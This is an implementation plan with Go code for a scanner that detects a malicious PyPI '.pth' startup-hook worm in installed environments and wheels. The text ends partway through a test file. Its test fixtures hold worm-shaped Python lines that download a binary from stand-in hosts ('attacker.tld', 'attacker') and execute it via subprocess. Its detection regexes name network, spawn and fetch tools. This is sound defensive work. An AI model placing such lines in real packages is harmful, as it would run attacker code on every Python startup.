# Hades / Shai-Hulud `.pth` Worm Defense Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Detect the Hades PyPI `.pth` startup-hook worm by content (not name) at three points — already-installed venvs, incoming wheels, and pip/uv/poetry/pdm commands issued by an agent — plus host-artifact / persistence markers and a stopgap static IOC source.

**Architecture:** Mirror `internal/gypscan` (npm `binding.gyp` worm defense) one-for-one. A pure detector package (`internal/pthscan`) exposes `Inspect(Input) Verdict`. Three callers own bytes and turn verdicts into findings/refusals: an existing-tree walker (`internal/scan/pth`), an in-memory wheel-zip prescan (`internal/pthscan/wheel`), and the install hot path in `cmd/veto`. The Claude Code hook gains a Python-family branch. `internal/scan/agentsurface` gains Hades infection markers. A new minimal `internal/intel/sources/hades` source ships the known Hades package@versions as a stopgap. No Python is ever executed, no sdist is ever built, and no GitHub-account enumeration is performed.

**Tech Stack:** Go 1.x; `archive/zip` for wheel reading; `github.com/brynbellomy/go-utils/errors` for wrapping; `github.com/stretchr/testify/require` for tests; existing `internal/scan` / `internal/intel` / `internal/gate` / `internal/hook/claudecode` packages.

**Spec:** `docs/superpowers/specs/2026-06-10-hades-pth-defense-design.md`.

**Mirror map:** Each new file has an upstream sibling — read the sibling first, then write the new file applying the diff this plan calls out.

| New file | Upstream sibling to mirror |
|---|---|
| `internal/pthscan/pthscan.go` | `internal/gypscan/gypscan.go` |
| `internal/pthscan/pthscan_test.go` | `internal/gypscan/gypscan_test.go` |
| `internal/pthscan/wheel/wheel.go` | `internal/gypscan/tarball/tarball.go` |
| `internal/pthscan/wheel/wheel_test.go` | `internal/gypscan/tarball/tarball_test.go` |
| `internal/pthscan/wheel/live_real_test.go` | `internal/gypscan/tarball/live_real_test.go` |
| `internal/scan/pth/pth.go` | `internal/scan/gyp/gyp.go` |
| `internal/scan/pth/pth_test.go` | `internal/scan/gyp/gyp_test.go` |
| `cmd/veto/pth_preflight.go` | `cmd/veto/gyp_preflight.go` |
| `cmd/veto/pth_wheel.go` | `cmd/veto/gyp_tarball.go` |
| `internal/intel/sources/hades/hades.go` | `internal/intel/sources/aikido/aikido.go` (shape only — no HTTP) |

---

## Task 1: `pthscan` package skeleton — types, `Inspect`, line tokenization

**Files:**
- Create: `internal/pthscan/pthscan.go`
- Test: `internal/pthscan/pthscan_test.go`

This task establishes the package surface and the line-walker (Python's own rule: a line is executable iff its first non-whitespace token is `import`; blank and `#` lines are inert; all other lines are inert path entries). No allowlist and no payload regex yet — every executable line yields `medium`. Subsequent tasks layer in allowlist, payload classification, and excerpt rendering.

- [ ] **Step 1: Write the package doc + types**

Create `internal/pthscan/pthscan.go`:

```go
// Package pthscan is a content heuristic for the Hades / Shai-Hulud PyPI
// supply-chain worm (June 2026), the Python branch of the same Miasma
// lineage gypscan fights on npm. The worm ships its payload as a `*-setup.pth`
// file inside a wheel; Python's `site` module evaluates every `*.pth` whose
// first token is `import` at each interpreter startup, so the file detonates
// on the next `python` invocation in a poisoned environment — every time, not
// just at install.
//
// pthscan reads a single `.pth` file's bytes and classifies it as benign,
// structurally anomalous, or worm-shaped. It performs no I/O, runs no
// Python, and never executes the file. Callers (the scan walker, the
// wheel prescan, the Claude Code hook) own the bytes and turn a Verdict
// into their own finding/refusal type.
package pthscan

import (
	"regexp"
	"strings"
)

// Severity ranks how confident pthscan is that a .pth is malicious.
type Severity string

const (
	// SeverityNone: only inert path lines, or an executable line matching
	// the tightly-anchored known-legit allowlist (distutils-precedence,
	// PEP 660 __editable__*, legacy easy-install).
	SeverityNone Severity = "none"

	// SeverityMedium: an executable .pth line that is neither obviously
	// payload-shaped nor on the allowlist — a structural anomaly worth
	// surfacing in `veto scan`, not on its own enough to block the
	// install hot path.
	SeverityMedium Severity = "medium"

	// SeverityCritical: a confirmed startup-time code-execution payload —
	// an `import`-line carrying network / spawn / dynamic-exec /
	// deobfuscation / runtime-fetch / worm-marker tokens. This is the
	// Hades / Shai-Hulud signature. Do not install; do not run python in
	// this environment.
	SeverityCritical Severity = "critical"
)

// Signal is one matched heuristic.
type Signal struct {
	Code    string
	Detail  string
	Excerpt string
}

// Verdict is the result of inspecting one .pth file.
type Verdict struct {
	Severity Severity
	Signals  []Signal
}

// Flagged reports whether the .pth is suspicious enough to surface or block.
func (v Verdict) Flagged() bool {
	return v.Severity == SeverityMedium || v.Severity == SeverityCritical
}

// Input is everything pthscan needs to classify one .pth.
type Input struct {
	// PthContent is the raw bytes of the .pth file. Required.
	PthContent []byte

	// FileName is the base name (e.g. "evil-setup.pth"). Optional but
	// recommended: a `*-setup.pth` name is a worm marker on its own.
	FileName string

	// SiblingFiles is a flat list of base names alongside the .pth in
	// the same dist. Optional; currently unused but reserved for future
	// "is this distribution shipping anything else?" heuristics.
	SiblingFiles []string

	// Truncated indicates the caller hit its size cap and PthContent
	// holds only a prefix. pthscan treats a truncated .pth as critical
	// (fail-closed: a worm can hide past the cap).
	Truncated bool
}

const maxExcerpt = 200
```

- [ ] **Step 2: Add the `Inspect` entrypoint with line-walker + "executable line ⇒ medium" baseline**

Append to `internal/pthscan/pthscan.go`:

```go
// Inspect classifies a single .pth file. It never errors: an empty .pth
// yields SeverityNone (Python ignores blank files), and every positive
// signal is additive. Inspect is pure and safe for concurrent use.
func Inspect(in Input) Verdict {
	if in.Truncated {
		return Verdict{
			Severity: SeverityCritical,
			Signals: []Signal{{
				Code:   "pth-file-too-large",
				Detail: ".pth file exceeded the scanner size cap and cannot be fully inspected; treating as unscannable so payloads cannot hide after the read cap.",
			}},
		}
	}
	content := string(in.PthContent)
	if strings.TrimSpace(content) == "" {
		return Verdict{Severity: SeverityNone}
	}

	var signals []Signal
	severity := SeverityNone
	bump := func(s Severity) {
		if severityRank(s) > severityRank(severity) {
			severity = s
		}
	}

	for _, line := range executableLines(content) {
		signals = append(signals, Signal{
			Code:    "pth-executable-line",
			Detail:  "executable `import …` line in a .pth file — site.py exec()'s these at every interpreter startup.",
			Excerpt: excerpt(line.body),
		})
		bump(SeverityMedium)
	}

	return Verdict{Severity: severity, Signals: signals}
}

// executableLine carries an executable .pth line's body (everything after
// the leading whitespace) plus its 0-based offset in the original content,
// so excerpt rendering and tests can point at exact bytes.
type executableLine struct {
	body   string
	offset int
}

// executableLines walks the .pth using Python's site.py rule: a line is
// executable iff its first non-whitespace token is `import` (case-sensitive,
// matching CPython). Blank lines and lines whose first non-whitespace
// character is `#` are inert. All other lines are inert path entries.
func executableLines(content string) []executableLine {
	var out []executableLine
	start := 0
	for i := 0; i <= len(content); i++ {
		if i < len(content) && content[i] != '\n' {
			continue
		}
		raw := content[start:i]
		line := raw
		if strings.HasSuffix(line, "\r") {
			line = line[:len(line)-1]
		}
		trimmed := strings.TrimLeft(line, " \t")
		if trimmed == "" || strings.HasPrefix(trimmed, "#") {
			start = i + 1
			continue
		}
		// Python checks for `import` as the first token; tolerate either
		// `import x` or `import(x)` (the latter is unusual but still parsed).
		if strings.HasPrefix(trimmed, "import ") || strings.HasPrefix(trimmed, "import(") || trimmed == "import" {
			out = append(out, executableLine{body: trimmed, offset: start + (len(line) - len(trimmed))})
		}
		start = i + 1
	}
	return out
}

func excerpt(line string) string {
	flat := strings.Join(strings.Fields(line), " ")
	if len(flat) > maxExcerpt {
		flat = flat[:maxExcerpt] + "…"
	}
	return flat
}

func severityRank(s Severity) int {
	switch s {
	case SeverityCritical:
		return 3
	case SeverityMedium:
		return 2
	case SeverityNone:
		return 1
	default:
		return 0
	}
}
```

- [ ] **Step 3: Write failing baseline tests**

Create `internal/pthscan/pthscan_test.go`:

```go
package pthscan_test

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
)

func codes(v pthscan.Verdict) []string {
	out := make([]string, 0, len(v.Signals))
	for _, s := range v.Signals {
		out = append(out, s.Code)
	}
	return out
}

func hasSignal(v pthscan.Verdict, code string) bool {
	for _, s := range v.Signals {
		if s.Code == code {
			return true
		}
	}
	return false
}

func TestInspectEmpty(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte{}})
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectPathOnly(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("foo/bar\n../sibling\n# a comment\n\n")})
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectExecutableLineMedium(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("import some_legit_module\n")})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "pth-executable-line"), "got %v", codes(v))
}

func TestInspectTruncatedIsCritical(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("foo/bar\n"), Truncated: true})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "pth-file-too-large"))
}

func TestInspectIgnoresLeadingWhitespace(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("    import x\n")})
	require.True(t, v.Flagged())
	require.True(t, hasSignal(v, "pth-executable-line"))
}

func TestInspectIgnoresCommentLines(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("# import a\n# not executable\n")})
	require.False(t, v.Flagged())
}

// Used by later tasks. Centralised here so subsequent tests can rely on it.
func mustContain(t *testing.T, hay, needle string) {
	t.Helper()
	require.True(t, strings.Contains(hay, needle), "expected %q in %q", needle, hay)
}
```

- [ ] **Step 4: Run the baseline tests, fix until green, commit**

Run:

```bash
go test ./internal/pthscan/...
```

Expected: PASS for all six tests.

Commit:

```bash
git add internal/pthscan/pthscan.go internal/pthscan/pthscan_test.go
git commit -m "feat(pthscan): package skeleton + line-walker baseline"
```

---

## Task 2: `pthscan` allowlist for legitimate executable `.pth` shapes

**Files:**
- Modify: `internal/pthscan/pthscan.go`
- Test: `internal/pthscan/pthscan_test.go`

Real Python tooling ships executable `.pth` files: setuptools' `distutils-precedence.pth`, PEP 660 editable installs' `__editable__*.pth`, and legacy `easy-install.pth` path-munge. The allowlist is **anchored** — full-line regex, not substring — so a worm cannot smuggle a payload by *also* mentioning `__editable__`. This is the lesson from gypscan's anchored `nativeHelperLookupRe`.

- [ ] **Step 1: Add the allowlist regex pack and helper**

Append to `internal/pthscan/pthscan.go` (above `severityRank`):

```go
// knownLegitLines is the anchored allowlist of executable .pth line shapes
// real Python tooling produces. Each entry is a whole-line regex (after the
// leading whitespace is stripped); a worm that *also* names __editable__ or
// _distutils_hack does NOT match because the regex anchors `^` and `$` and
// covers the entire legitimate body, not a substring.
var knownLegitLines = []*regexp.Regexp{
	// setuptools' distutils-precedence shim. Distros ship variants; the
	// pattern is "import os; <hack-import>".
	regexp.MustCompile(`^import\s+os\s*;\s*(?:[A-Za-z_][A-Za-z0-9_]*\s*=\s*os\.environ\.get\(.+?\)\s*;\s*)?__import__\(\s*['"]_distutils_hack['"]\s*\)(?:\s*\.\s*[A-Za-z_][A-Za-z0-9_]*\(\s*\))?\s*$`),

	// PEP 660 editable installs — pip writes __editable___<name>_finder.py
	// plus a one-line .pth that imports and installs the finder.
	regexp.MustCompile(`^import\s+__editable___[A-Za-z0-9_]+_finder\s*;\s*__editable___[A-Za-z0-9_]+_finder\.install\(\s*\)\s*$`),
	regexp.MustCompile(`^from\s+__editable___[A-Za-z0-9_]+(?:_finder)?\s+import\s+[A-Za-z_][A-Za-z0-9_]*\s*$`),
	regexp.MustCompile(`^import\s+__editable___[A-Za-z0-9_]+_finder\s*;\s*MapPathFinder\.install\(\s*\)\s*$`),

	// Legacy easy-install.pth path-munge.
	regexp.MustCompile(`^import\s+sys\s*;\s*sys\.__plen\s*=\s*len\(sys\.path\)\s*$`),
	regexp.MustCompile(`^import\s+sys\s*;\s*sys\.__egginsert\s*=\s*0\s*$`),
}

// allowlistedFileName reports whether the .pth's base name is one whose
// known-legit body is allowed by the regex pack above. We don't require this
// — the body regex is the load-bearing check — but a non-matching body that
// nevertheless rides one of these well-known names still gets flagged.
var allowlistedLegitName = regexp.MustCompile(`^(?:distutils-precedence\.pth|__editable__[._-][A-Za-z0-9_.-]+\.pth|easy-install\.pth)$`)

// matchesKnownLegit reports whether trimmed (a single .pth executable line
// with leading whitespace already removed and no trailing newline) matches
// any whole-line legit pattern.
func matchesKnownLegit(trimmed string) bool {
	for _, re := range knownLegitLines {
		if re.MatchString(trimmed) {
			return true
		}
	}
	return false
}
```

- [ ] **Step 2: Wire the allowlist into `Inspect`**

Replace the `for _, line := range executableLines(content)` block inside `Inspect` with:

```go
	for _, line := range executableLines(content) {
		if matchesKnownLegit(line.body) {
			continue
		}
		signals = append(signals, Signal{
			Code:    "pth-executable-line",
			Detail:  "executable `import …` line in a .pth file with no payload tokens, but not on the known-legit allowlist — site.py exec()'s these at every interpreter startup.",
			Excerpt: excerpt(line.body),
		})
		bump(SeverityMedium)
	}
```

- [ ] **Step 3: Add failing allowlist tests**

Append to `internal/pthscan/pthscan_test.go`:

```go
func TestInspectAllowsDistutilsPrecedence(t *testing.T) {
	body := `import os; var = os.environ.get('SETUPTOOLS_USE_DISTUTILS', 'local'); __import__('_distutils_hack').add_shim()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
	require.False(t, v.Flagged(), "got %v", codes(v))
}

func TestInspectAllowsBareDistutilsHack(t *testing.T) {
	body := `import os; __import__('_distutils_hack').add_shim()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
	require.False(t, v.Flagged())
}

func TestInspectAllowsPEP660Editable(t *testing.T) {
	body := `import __editable___my_pkg_0_1_0_finder; __editable___my_pkg_0_1_0_finder.install()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "__editable__.my_pkg-0.1.0.pth"})
	require.False(t, v.Flagged())
}

func TestInspectAllowsLegacyEasyInstall(t *testing.T) {
	body := `import sys; sys.__plen = len(sys.path)`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "easy-install.pth"})
	require.False(t, v.Flagged())
}

func TestInspectRejectsAllowlistImpostor(t *testing.T) {
	// A worm that mentions __editable__ but otherwise smuggles payload-shaped
	// content past the anchored allowlist must still be flagged.
	body := `import __editable___finder; import urllib.request; urllib.request.urlretrieve('http://attacker/x','x')`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
	require.True(t, v.Flagged())
}
```

- [ ] **Step 4: Run the tests and commit**

```bash
go test ./internal/pthscan/...
```

All allowlist cases pass; the impostor still produces a Medium (Critical will be added in Task 3).

```bash
git add internal/pthscan/pthscan.go internal/pthscan/pthscan_test.go
git commit -m "feat(pthscan): anchored allowlist for distutils/PEP660/easy-install"
```

---

## Task 3: `pthscan` payload classification — Critical signals

**Files:**
- Modify: `internal/pthscan/pthscan.go`
- Test: `internal/pthscan/pthscan_test.go`

This is the load-bearing detector. The spec defines six payload token groups: network, process-spawn, dynamic-exec, deobfuscation, runtime-fetch, worm-markers. An executable `import`-line whose body matches any group is **Critical** and supersedes the Medium "structural" emission. The worm-marker name signal (`-setup.pth`) raises severity to Medium on its own (a filename signal, not a body signal).

- [ ] **Step 1: Add the payload regex pack and helpers**

Append to `internal/pthscan/pthscan.go` (above `knownLegitLines`):

```go
// payloadGroups partitions the Hades payload vocabulary by the *kind* of
// risk so the finding's evidence can name which capability the worm used.
// Group order matters only for diagnostic readability; the first matching
// group wins per signal so the report points at the most specific lens.
var payloadGroups = []struct {
	code  string
	label string
	re    *regexp.Regexp
}{
	{
		code:  "pth-payload-network",
		label: "uses network calls (urllib, requests, socket, http.client, ftplib) — startup-time outbound fetch is the Hades infection pattern.",
		re:    regexp.MustCompile(`\b(?:urllib(?:\.request)?|urlopen|urlretrieve|requests|socket|http\.client|httplib|ftplib)\b`),
	},
	{
		code:  "pth-payload-spawn",
		label: "spawns a process (subprocess, os.system/popen, pty.spawn, os.exec*) at interpreter startup.",
		re:    regexp.MustCompile(`\b(?:subprocess|os\.system|os\.popen|popen|pty\.spawn|os\.exec[a-z]*)\b`),
	},
	{
		code:  "pth-payload-dynamic-exec",
		label: "evaluates code dynamically (exec/eval/compile/__import__ on a computed string).",
		re:    regexp.MustCompile(`\b(?:exec\(|eval\(|compile\(|__import__\()`),
	},
	{
		code:  "pth-payload-deobfuscation",
		label: "decodes or unpacks an embedded blob (base64, marshal, codecs.decode, hex/lzma/zlib) — startup-time decoders are the Hades obfuscation tell.",
		re:    regexp.MustCompile(`\b(?:b64decode|base64|marshal\.loads|codecs\.decode|bytes\.fromhex|zlib\.decompress|lzma)\b|\.decode\(\s*['"]hex['"]\s*\)|(?:\\x[0-9A-Fa-f]{2}){8,}`),
	},
	{
		code:  "pth-payload-runtime-fetch",
		label: "names an external runtime / fetcher (bun, bunx, curl, wget, node, deno) — startup-time downloader for a second-stage payload.",
		re:    regexp.MustCompile(`\b(?:bun|bunx|curl|wget|node|deno)\b`),
	},
	{
		code:  "pth-payload-worm-marker",
		label: "carries a Hades / Shai-Hulud worm marker string.",
		re:    regexp.MustCompile(`\.bun_ran\b|_index\.js\b|\bHades\b|shai-hulud|stygian|tartarean`),
	},
}

// fileNameSetupRe matches the `*-setup.pth` shape Hades-style wheels drop —
// a filename signal independent of body content. Real PyPI ecosystems are
// not known to ship `<name>-setup.pth`; the convention is `distutils-precedence.pth`,
// `__editable__.<name>-<ver>.pth`, `easy-install.pth`, or per-package names
// without a `-setup` suffix.
var fileNameSetupRe = regexp.MustCompile(`(?i)[-_]setup\.pth$`)

// scanPayloadSignals returns the per-group critical signals firing on body
// (an executable line with its leading whitespace already removed).
func scanPayloadSignals(body string) []Signal {
	var out []Signal
	for _, g := range payloadGroups {
		if g.re.MatchString(body) {
			out = append(out, Signal{
				Code:    g.code,
				Detail:  g.label,
				Excerpt: excerpt(body),
			})
		}
	}
	return out
}
```

- [ ] **Step 2: Wire payload classification + filename signal into `Inspect`**

Replace the entire `for _, line := range executableLines(content)` block with:

```go
	for _, line := range executableLines(content) {
		if matchesKnownLegit(line.body) {
			continue
		}
		if payload := scanPayloadSignals(line.body); len(payload) > 0 {
			signals = append(signals, payload...)
			bump(SeverityCritical)
			continue
		}
		signals = append(signals, Signal{
			Code:    "pth-executable-line",
			Detail:  "executable `import …` line in a .pth file with no payload tokens, but not on the known-legit allowlist — site.py exec()'s these at every interpreter startup.",
			Excerpt: excerpt(line.body),
		})
		bump(SeverityMedium)
	}

	if in.FileName != "" && fileNameSetupRe.MatchString(in.FileName) && !allowlistedLegitName.MatchString(in.FileName) {
		signals = append(signals, Signal{
			Code:    "pth-setup-filename",
			Detail:  ".pth filename matches the Hades `*-setup.pth` worm shape — legitimate Python tooling does not ship `-setup.pth` files; the canonical names are distutils-precedence.pth, __editable__.<name>-<ver>.pth, or per-package <name>.pth without a `-setup` suffix.",
			Excerpt: in.FileName,
		})
		bump(SeverityMedium)
	}
```

- [ ] **Step 3: Add critical-path tests**

Append to `internal/pthscan/pthscan_test.go`:

```go
// hadesPth is the canonical Hades shape: a `*-setup.pth` carrying an
// import-line that fetches Bun, drops _index.js, and execs it. We exercise
// each payload group at least once.
const hadesPth = `import urllib.request, os, subprocess; ` +
	`urllib.request.urlretrieve('https://attacker.tld/bun', '/tmp/bun'); ` +
	`os.chmod('/tmp/bun', 0o755); ` +
	`subprocess.Popen(['/tmp/bun', '/tmp/_index.js'])` + "\n"

func TestInspectFlagsHadesPth(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(hadesPth),
		FileName:   "ensmallen-setup.pth",
	})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "pth-payload-network"), "got %v", codes(v))
	require.True(t, hasSignal(v, "pth-payload-spawn"))
	require.True(t, hasSignal(v, "pth-payload-runtime-fetch"))
	require.True(t, hasSignal(v, "pth-setup-filename"))
}

func TestInspectPayloadGroupsTable(t *testing.T) {
	cases := []struct {
		name string
		body string
		want string
	}{
		{"network-urllib", "import urllib.request as r", "pth-payload-network"},
		{"network-requests", "import requests as r", "pth-payload-network"},
		{"spawn-subprocess", "import subprocess as s", "pth-payload-spawn"},
		{"spawn-os-system", "import os; os.system('x')", "pth-payload-spawn"},
		{"dynamic-exec", "import x; exec(x)", "pth-payload-dynamic-exec"},
		{"deobfuscation-b64", "import base64; base64.b64decode('xx')", "pth-payload-deobfuscation"},
		{"deobfuscation-hex-escapes", `import x; exec("\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad")`, "pth-payload-deobfuscation"},
		{"runtime-fetch-bun", "import os; os.popen('bun /tmp/x.js')", "pth-payload-runtime-fetch"},
		{"runtime-fetch-curl", "import os; os.popen('curl http://x')", "pth-payload-runtime-fetch"},
		{"worm-marker-bun-ran", "import os; open('/tmp/.bun_ran','w').close()", "pth-payload-worm-marker"},
		{"worm-marker-name", "import os; os.system('echo shai-hulud')", "pth-payload-worm-marker"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(c.body + "\n")})
			require.True(t, v.Flagged())
			require.Equal(t, pthscan.SeverityCritical, v.Severity)
			require.True(t, hasSignal(v, c.want), "missing %s; got %v", c.want, codes(v))
		})
	}
}

func TestInspectSetupFilenameAloneIsMedium(t *testing.T) {
	// A `*-setup.pth` with only path-entry lines and no executable line is
	// suspicious (no real ecosystem ships this name) but not on its own a
	// critical install-time payload.
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte("some/path\n"),
		FileName:   "evil-setup.pth",
	})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "pth-setup-filename"))
}

func TestInspectEditableFilenameNotFlagged(t *testing.T) {
	// __editable__.foo-1.2.3.pth ending in `-1.2.3.pth` must not be confused
	// with `-setup.pth` even though both end in `.pth`.
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(`import __editable___foo_1_2_3_finder; __editable___foo_1_2_3_finder.install()` + "\n"),
		FileName:   "__editable__.foo-1.2.3.pth",
	})
	require.False(t, v.Flagged(), "got %v", codes(v))
}
```

- [ ] **Step 4: Run the tests and commit**

```bash
go test ./internal/pthscan/...
```

All payload + filename tests pass.

```bash
git add internal/pthscan/pthscan.go internal/pthscan/pthscan_test.go
git commit -m "feat(pthscan): payload classification + setup-filename signal"
```

---

## Task 4: `pthscan/wheel` package — in-memory wheel-zip prescan

**Files:**
- Create: `internal/pthscan/wheel/wheel.go`
- Test: `internal/pthscan/wheel/wheel_test.go`

A wheel (`.whl`) is an inert zip. The `.pth` file is dropped via the data scheme (`<dist>-<ver>.data/purelib/*.pth` or `…/platlib/*.pth`) or as a top-level `*.pth` listed in `RECORD`. This package opens the zip, enumerates `.pth` entries via both paths without extracting to disk, and runs each through `pthscan.Inspect`. Mirror `internal/gypscan/tarball/tarball.go`.

- [ ] **Step 1: Write the wheel reader skeleton**

Create `internal/pthscan/wheel/wheel.go`:

```go
// Package wheel inspects a Python wheel (.whl) for the Hades / Shai-Hulud
// .pth startup-hook worm without extracting it to disk and without ever
// invoking Python. A wheel is an inert zip; the .pth file is dropped via
// the data scheme (<dist>-<ver>.data/purelib/*.pth, /platlib/*.pth) or as
// a top-level *.pth listed in RECORD. We enumerate both and run each
// .pth through pthscan.Inspect.
package wheel

import (
	"archive/zip"
	"bytes"
	"encoding/csv"
	"io"
	"path"
	"strings"

	"github.com/brynbellomy/go-utils/errors"

	"github.com/brynbellomy/veto/internal/pthscan"
)

// maxPthBytes caps how much of any single .pth we read into memory. Real
// .pth files are tiny — a few hundred bytes; an oversized one is treated
// as unscannable (Critical) rather than trusting a clean prefix.
const maxPthBytes = 256 * 1024

// maxWheelEntries caps wheel-zip entries walked. Real wheels have hundreds
// of entries; pathological wheels with millions are rejected.
const maxWheelEntries = 100_000

// Inspect reads a wheel from r (must be a ReaderAt; the *bytes.Reader and
// *os.File from a downloaded wheel both satisfy this) of size and classifies
// every .pth file inside via pthscan.Inspect. Returns the highest-severity
// verdict found, with all firing .pth files' signals concatenated.
//
// A wheel with no .pth files yields SeverityNone (nothing for site.py to
// execute). Errors are returned only on malformed zip / IO; an unparseable
// RECORD is non-fatal (the data-scheme walk catches the .pth too).
func Inspect(r io.ReaderAt, size int64) (pthscan.Verdict, error) {
	zr, err := zip.NewReader(r, size)
	if err != nil {
		return pthscan.Verdict{}, errors.With(err, "open wheel zip")
	}
	if len(zr.File) > maxWheelEntries {
		return pthscan.Verdict{}, errors.WithNew("wheel has too many entries").Set("limit", maxWheelEntries)
	}

	pthFiles, err := collectPthEntries(zr)
	if err != nil {
		return pthscan.Verdict{}, err
	}
	if len(pthFiles) == 0 {
		return pthscan.Verdict{Severity: pthscan.SeverityNone}, nil
	}

	worst := pthscan.SeverityNone
	var signals []pthscan.Signal
	for _, p := range pthFiles {
		verdict := pthscan.Inspect(pthscan.Input{
			PthContent: p.content,
			FileName:   path.Base(p.name),
			Truncated:  p.truncated,
		})
		if severityRank(verdict.Severity) > severityRank(worst) {
			worst = verdict.Severity
		}
		signals = append(signals, verdict.Signals...)
	}
	return pthscan.Verdict{Severity: worst, Signals: signals}, nil
}

type pthEntry struct {
	name      string // entry path inside the zip
	content   []byte
	truncated bool
}

// collectPthEntries walks the wheel zip and gathers every .pth file via
// either the data scheme or a top-level location. RECORD is consulted as a
// hint but not relied on (some adversarial wheels omit / corrupt RECORD).
func collectPthEntries(zr *zip.Reader) ([]pthEntry, error) {
	var out []pthEntry
	recordEntries := map[string]struct{}{}
	for _, f := range zr.File {
		name := path.Clean(f.Name)
		if name == "." || strings.HasPrefix(name, "/") || strings.HasPrefix(name, "..") {
			continue
		}
		base := path.Base(name)
		if strings.HasSuffix(base, ".dist-info/RECORD") || strings.HasSuffix(name, "RECORD") && strings.Contains(name, ".dist-info/") {
			// Parse RECORD as a CSV; first column is the entry path. Best-effort.
			content, _, err := readZipEntry(f, maxPthBytes*4)
			if err == nil {
				rd := csv.NewReader(bytes.NewReader(content))
				rd.FieldsPerRecord = -1
				for {
					row, err := rd.Read()
					if err != nil {
						break
					}
					if len(row) == 0 {
						continue
					}
					rel := strings.TrimSpace(row[0])
					if strings.HasSuffix(rel, ".pth") {
						recordEntries[rel] = struct{}{}
					}
				}
			}
			continue
		}
		if !strings.HasSuffix(base, ".pth") {
			continue
		}
		if !isPthInWheel(name) {
			continue
		}
		content, truncated, err := readZipEntry(f, maxPthBytes)
		if err != nil {
			return nil, errors.With(err, "read wheel .pth entry").Set("path", name)
		}
		out = append(out, pthEntry{name: name, content: content, truncated: truncated})
	}
	// RECORD entries we haven't seen yet would be a `.pth` in an unusual
	// path. The zip walk above already enumerated every file; recordEntries
	// is informational. (We keep the parse in place because it would matter
	// in a future where a wheel ships a custom installer script that places
	// .pth files outside the data-scheme directories.)
	_ = recordEntries
	return out, nil
}

// isPthInWheel reports whether a zip entry path is a position where Python
// will install a .pth at install-time: either the data scheme's purelib /
// platlib directories, or a top-level location alongside the dist-info.
func isPthInWheel(name string) bool {
	if !strings.HasSuffix(name, ".pth") {
		return false
	}
	// Top-level .pth (uncommon but valid).
	if !strings.Contains(name, "/") {
		return true
	}
	// Data scheme: <dist>-<ver>.data/purelib/<...>.pth or .../platlib/<...>.pth
	if strings.Contains(name, ".data/purelib/") || strings.Contains(name, ".data/platlib/") {
		return true
	}
	return false
}

func readZipEntry(f *zip.File, limit int64) ([]byte, bool, error) {
	rc, err := f.Open()
	if err != nil {
		return nil, false, err
	}
	defer rc.Close()
	buf, err := io.ReadAll(io.LimitReader(rc, limit+1))
	if err != nil {
		return nil, false, err
	}
	if int64(len(buf)) > limit {
		return buf[:limit], true, nil
	}
	return buf, false, nil
}

func severityRank(s pthscan.Severity) int {
	switch s {
	case pthscan.SeverityCritical:
		return 3
	case pthscan.SeverityMedium:
		return 2
	case pthscan.SeverityNone:
		return 1
	default:
		return 0
	}
}
```

- [ ] **Step 2: Add a tiny test helper that builds a wheel-zip fixture**

Create `internal/pthscan/wheel/wheel_test.go`:

```go
package wheel_test

import (
	"archive/zip"
	"bytes"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
	"github.com/brynbellomy/veto/internal/pthscan/wheel"
)

func buildWheel(t *testing.T, entries map[string]string) (*bytes.Reader, int64) {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, content := range entries {
		fw, err := w.Create(name)
		require.NoError(t, err)
		_, err = fw.Write([]byte(content))
		require.NoError(t, err)
	}
	require.NoError(t, w.Close())
	return bytes.NewReader(buf.Bytes()), int64(buf.Len())
}

func TestInspectNoPth(t *testing.T) {
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-1.0.0.dist-info/METADATA": "Name: foo\n",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectDataSchemePurelibFlagsWorm(t *testing.T) {
	hadesBody := `import urllib.request, subprocess; ` +
		`urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); ` +
		`subprocess.Popen(['/tmp/bun','/tmp/_index.js'])` + "\n"
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-1.0.0.data/purelib/ensmallen-setup.pth": hadesBody,
